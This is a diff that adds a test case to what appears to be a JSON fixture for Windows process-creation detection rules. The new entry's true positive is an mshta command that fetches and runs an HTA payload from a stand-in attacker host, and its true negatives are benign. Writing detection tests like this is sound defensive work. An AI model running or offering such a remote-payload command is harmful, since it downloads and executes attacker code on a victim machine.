@@ -70,5 +70,12 @@
       {"Image": "C:\\Windows\\System32\\wbem\\wmic.exe", "CommandLine": "wmic process list brief"},
       {"Image": "C:\\Windows\\System32\\wbem\\wmic.exe", "CommandLine": "wmic os get caption"}
     ]
+  },
+  "proc_creation_win_mshta_remote.yml": {
+    "true_positive": {"Image": "C:\\Windows\\System32\\mshta.exe", "CommandLine": "mshta.exe http://evil.example/payload.hta"},
+    "true_negatives": [
+      {"Image": "C:\\Windows\\System32\\mshta.exe", "CommandLine": "mshta.exe C:\\local\\dialog.hta"},
+      {"Image": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd /c echo http"}
+    ]
   }
 }
